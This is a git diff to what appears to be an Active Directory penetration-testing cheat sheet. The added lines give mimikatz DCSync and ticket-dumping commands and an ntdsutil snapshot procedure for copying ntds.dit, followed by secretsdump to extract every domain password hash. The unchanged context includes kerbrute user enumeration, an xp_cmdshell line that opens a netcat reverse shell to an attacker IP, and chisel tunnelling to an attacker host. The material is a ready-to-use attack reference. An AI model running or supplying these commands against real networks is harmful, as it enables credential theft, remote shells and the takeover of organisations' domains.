@@ -120,7 +120,7 @@ python3 gMSADumper.py -u <username> -p <password> -d <domain>
 enumerate domain usernames
 
 ```shell
-# 1 enumerate users
+# 1 enumerate users 
 kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> userenum  ~/Documents/userlist.txt
 # 2 valid users
 kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt | grep "USERNAME" | cut -f1 -d"@" | cut -f4 -d":" | tr -d "[:blank:]" > /tmp/users.txt
@@ -592,14 +592,40 @@ EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe <attacker ip> <attacker port
 
 [![Windows](https://badgen.net/badge/icon/windows?icon=windows&label)](https://microsoft.com/windows/)
 
-DCSync
+- DCSync
 
 ```powershell
+.\mimikatz.exe
+privilege::debug
 <# already a domain administrator #> 
 lsadump::dcsync /domain:<domain> /dc:<domain controller> /user:<specific user>
 <# authuser with Replicating Directory Changes and Replicating Directory Changes All permissions #>
 lsadump::dcsync /domain:<domain> /dc:<domain controller> /user:<specific user> /authuser:<authuser> /authdomain:<authdomain> /authpassword:<authpassword> /authntlm
 <# e.g., lsadump::dcsync /domain:TEST.LOCAL /user:user01 /authuser:vitamin /authdomain:TEST /authpassword:"eRFWE5756872Gn" /authntlm #>
+```
+
+- Exporting AD member hashes
+
+```cmd
+REM
+REM create a snapshot
+ntdsutil snapshot "activate instance ntds" create quit quit
+REM
+ntdsutil "activate instance ntds" snapshot "mount {GUID}" quit quit
+REM copy file
+copy C:\$SNAP_{X}_VOLUMEC$\windows\NTDS\ntds.dit c:\users\administrator\desktop\ntds.dit
+```
+
+download ntds.dit to our pc
+
+```shell
+secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM local -outputfile /tmp/ADHashes.txt
+```
+
+- Dumping tickets
+
+```
+sekurlsa::tickets
 ```
 
 ### :open_file_folder: Vulnerabilities
@@ -670,7 +696,7 @@ Windows
 Linux
 
 ```shell
-# transport target service on port 1234 to our host(192.168.10.100) port 5678
+# transport target service on port 1234 to our pc(192.168.10.100) port 5678
 # ./chisel client 192.168.10.100:80 R:5678:localhost:1234
 # nmap -sC -sV -p5678 192.168.10.100 -Pn
 ./chisel client <attacker ip>:<attacker port> R:<attacker service port>:localhost:<target service port>
